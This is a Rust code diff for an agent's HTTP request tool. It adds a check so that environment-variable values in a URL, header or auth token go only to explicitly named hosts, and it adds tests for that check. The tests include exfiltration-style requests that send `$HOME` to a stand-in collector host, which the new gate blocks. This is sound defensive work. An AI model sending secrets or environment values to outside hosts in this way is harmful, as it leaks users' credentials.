@@ -1,9 +1,6 @@
 // src/adapters/outbound/tools/http/request.rs
-//! `http_request` tool — generic HTTP client for skill-driven API calls.
-//!
-//! Migrated from `http_tool_executor.rs` during Phase A / task A2.
-//! The old executor used `tokio::task::block_in_place` to bridge sync→async;
-//! this implementation is natively async and uses `ctx.http` directly.
+//! `http_request` tool — generic HTTP client for skill-driven API calls,
+//! natively async on `ctx.http`.
 
 use anyhow::{anyhow, bail, Context, Result};
 use async_trait::async_trait;
@@ -111,7 +108,11 @@ impl Tool for HttpRequestTool {
         let host = request.url.host_str().unwrap_or("");
         let gate = policy
             .check_url(&request.url)
-            .and_then(|_| ctx.scope.check_net_host(host));
+            .and_then(|_| ctx.scope.check_net_host(host))
+            .and_then(|_| match request.carries_env {
+                true => ctx.scope.check_named_host(host),
+                false => Ok(()),
+            });
         if let Err(e) = gate {
             audit.record(0, url_raw, None, Err(&e), None);
             return Err(e);
@@ -138,11 +139,15 @@ struct PreparedRequest {
     headers: Vec<(String, String, bool)>,
     auth: ResolvedAuth,
     return_body: bool,
+    /// An env value rides in the URL, a header or the auth: hop 0 needs a
+    /// host `net_hosts` names (not `"*"`); a cross-origin hop drops headers
+    /// and auth, and the URL is the server's.
+    carries_env: bool,
 }
 
 impl PreparedRequest {
     fn from_args(args: &Value, url_raw: &str, method_str: &str, ctx: &ToolCtx<'_>) -> Result<Self> {
-        let expanded = expand_env_refs(url_raw, ctx)?;
+        let (expanded, url_env) = expand_env_refs(url_raw, ctx)?;
         if !expanded.starts_with("https://") && !expanded.starts_with("http://") {
             bail!("http_request: url must start with http:// or https://");
         }
@@ -177,7 +182,11 @@ impl PreparedRequest {
             ctx,
         )?;
 
+        let carries_env = url_env
+            || headers.iter().any(|(_, _, env)| *env)
+            || !matches!(auth, ResolvedAuth::None);
         Ok(Self {
+            carries_env,
             url,
             method,
             body: arg_to_string(args, "body").filter(|b| !b.is_empty()),
@@ -556,8 +565,8 @@ fn parse_headers(raw: &str, ctx: &ToolCtx<'_>) -> Result<Vec<(String, String, bo
                 .as_str()
                 .map(String::from)
                 .unwrap_or_else(|| value.to_string());
-            let carried_env = v.contains('$');
-            Ok((key, expand_env_refs(&v, ctx)?, carried_env))
+            let (value, carried_env) = expand_env_refs(&v, ctx)?;
+            Ok((key, value, carried_env))
         })
         .collect()
 }
@@ -566,37 +575,32 @@ fn parse_headers(raw: &str, ctx: &ToolCtx<'_>) -> Result<Vec<(String, String, bo
 ///
 /// Each env read is gated by `ctx.scope.check_env_read(name)`; scopes whose
 /// `env_reads` list is empty will reject the expansion (default-deny).
-/// `permissive_scope` (the fallback for tools with no configured scope) sets
-/// `env_reads = ["*"]`, which the check honours as allow-any; a configured
-/// `[agents.*.scopes.http_request].env_reads` list narrows it.
-fn expand_env_refs(input: &str, ctx: &ToolCtx<'_>) -> Result<String> {
-    let mut out = String::new();
-    let bytes = input.as_bytes();
-    let mut idx = 0;
-    while idx < bytes.len() {
-        if bytes[idx] == b'$' {
-            idx += 1;
-            let start = idx;
-            while idx < bytes.len()
-                && ((bytes[idx] as char).is_ascii_uppercase()
-                    || (bytes[idx] as char).is_ascii_digit()
-                    || bytes[idx] == b'_')
-            {
-                idx += 1;
-            }
-            let name = &input[start..idx];
-            if name.is_empty() {
-                out.push('$');
-                continue;
-            }
-            let value = read_env(name, ctx)?;
-            out.push_str(&value);
+/// `permissive_scope` (the fallback for tools with no configured scope)
+/// grants none, so a `$VAR` needs `[agents.*.scopes.http_request].env_reads`
+/// (or `[default_scopes.http_request]`) naming it; `"*"` there allows any.
+/// Returns the text and whether any variable was expanded (the request
+/// then needs a host `net_hosts` names, `ToolScope::check_named_host`).
+fn expand_env_refs(input: &str, ctx: &ToolCtx<'_>) -> Result<(String, bool)> {
+    let mut out = String::with_capacity(input.len());
+    let mut expanded = false;
+    let mut rest = input;
+    while let Some(at) = rest.find('$') {
+        out.push_str(&rest[..at]);
+        let after = &rest[at + 1..];
+        let len = after
+            .bytes()
+            .take_while(|b| b.is_ascii_uppercase() || b.is_ascii_digit() || *b == b'_')
+            .count();
+        if len == 0 {
+            out.push('$');
         } else {
-            out.push(bytes[idx] as char);
-            idx += 1;
+            out.push_str(&read_env(&after[..len], ctx)?);
+            expanded = true;
         }
+        rest = &after[len..];
     }
-    Ok(out)
+    out.push_str(rest);
+    Ok((out, expanded))
 }
 
 /// Read an env var, gated by scope (`"*"` wildcard handled inside
@@ -625,20 +629,13 @@ fn mime_from_filename(filename: &str) -> String {
 mod tests {
     use super::*;
     use crate::adapters::outbound::shell::LocalShellExecutor;
-    use crate::domain::message::ToolCall;
     use crate::domain::scope::ToolScope;
     use crate::domain::secrets::SecretRegistry;
     use crate::ports::shell::ShellExecutionPort;
-    use crate::ports::tool_activity::ToolActivityPort;
     use serde_json::json;
     use std::path::{Path, PathBuf};
     use std::sync::Arc;
     use tempfile::TempDir;
-
-    struct NoopActivity;
-    impl ToolActivityPort for NoopActivity {
-        fn publish_tool_activity(&self, _call: &ToolCall) {}
-    }
 
     struct HttpHarness {
         workspace: PathBuf,
@@ -646,7 +643,6 @@ mod tests {
         shell: Arc<dyn ShellExecutionPort>,
         http: reqwest::Client,
         secrets: SecretRegistry,
-        activity: Arc<dyn ToolActivityPort>,
     }
 
     impl HttpHarness {
@@ -661,7 +657,6 @@ mod tests {
                     .tool_client(std::time::Duration::from_secs(5))
                     .unwrap(),
                 secrets: SecretRegistry::new(),
-                activity: Arc::new(NoopActivity),
             }
         }
 
@@ -671,9 +666,7 @@ mod tests {
                 scope: &self.scope,
                 shell: self.shell.as_ref(),
                 http: &self.http,
-                memory_manager: None,
                 secret_registry: &self.secrets,
-                activity: self.activity.as_ref(),
                 conversation: crate::ports::tool::ConversationView::empty(),
                 agent_config: None,
                 call_id: None,
@@ -786,6 +779,89 @@ mod tests {
             }
         });
         (format!("http://{addr}"), hits)
+    }
+
+    /// S2: an env value (URL, header or auth) goes only to a host
+    /// `net_hosts` names; `"*"` alone is not enough and nothing is sent
+    /// (the gate runs before any connection: the `.invalid` host is never
+    /// resolved). A named host gets it.
+    #[tokio::test]
+    async fn env_value_needs_a_named_host() {
+        use std::sync::atomic::Ordering::SeqCst;
+        let (base, hits) =
+            serve("HTTP/1.1 200 OK\r\nContent-Length: 2\r\nConnection: close\r\n\r\nok").await;
+        let tmp = TempDir::new().unwrap();
+        let scope = |hosts: &[&str]| ToolScope {
+            net_hosts: hosts.iter().map(|h| h.to_string()).collect(),
+            env_reads: vec!["HOME".into()],
+            ..Default::default()
+        };
+        let wild = HttpHarness::with_scope(tmp.path(), scope(&["*"]));
+        let far = "http://collector.invalid";
+        for args in [
+            json!({"url": format!("{far}/?h=$HOME"), "method": "GET"}),
+            json!({"url": format!("{far}/"), "method": "GET", "headers": "{\"X-K\":\"$HOME\"}"}),
+            json!({"url": format!("{far}/"), "method": "GET", "auth_bearer_env": "HOME"}),
+        ] {
+            let err = HttpRequestTool::new()
+                .execute(&args, &wild.ctx())
+                .await
+                .unwrap_err();
+            assert!(
+                format!("{err:#}").contains("only when net_hosts names it"),
+                "{err:#}"
+            );
+        }
+        let named = HttpHarness::with_scope(tmp.path(), scope(&["*", "127.0.0.1"]));
+        HttpRequestTool::new()
+            .execute(
+                &json!({"url": format!("{base}/?h=$HOME"), "method": "GET"}),
+                &named.ctx(),
+            )
+            .await
+            .unwrap();
+        assert_eq!(hits.load(SeqCst), 1);
+    }
+
+    /// S13: `"*"` does not reach a loopback server; naming it does.
+    #[tokio::test]
+    async fn wildcard_does_not_reach_loopback() {
+        let (base, hits) =
+            serve("HTTP/1.1 200 OK\r\nContent-Length: 2\r\nConnection: close\r\n\r\nok").await;
+        let tmp = TempDir::new().unwrap();
+        let wild = HttpHarness::with_scope(
+            tmp.path(),
+            ToolScope {
+                net_hosts: vec!["*".into()],
+                ..Default::default()
+            },
+        );
+        let err = HttpRequestTool::new()
+            .execute(
+                &json!({"url": format!("{base}/"), "method": "GET"}),
+                &wild.ctx(),
+            )
+            .await
+            .unwrap_err();
+        assert!(format!("{err:#}").contains("name it"), "{err:#}");
+        assert_eq!(hits.load(std::sync::atomic::Ordering::SeqCst), 0);
+    }
+
+    #[test]
+    fn env_expansion_keeps_non_ascii_text() {
+        let tmp = TempDir::new().unwrap();
+        let scope = ToolScope {
+            env_reads: vec!["HOME".into()],
+            ..Default::default()
+        };
+        let harness = HttpHarness::with_scope(tmp.path(), scope);
+        let home = std::env::var("HOME").unwrap();
+        let (out, expanded) = expand_env_refs("ü-$HOME-€ $ $x", &harness.ctx()).unwrap();
+        assert_eq!(out, format!("ü-{home}-€ $ $x"));
+        assert!(expanded);
+        let (out, expanded) = expand_env_refs("price: 5$", &harness.ctx()).unwrap();
+        assert_eq!(out, "price: 5$");
+        assert!(!expanded);
     }
 
     #[tokio::test]
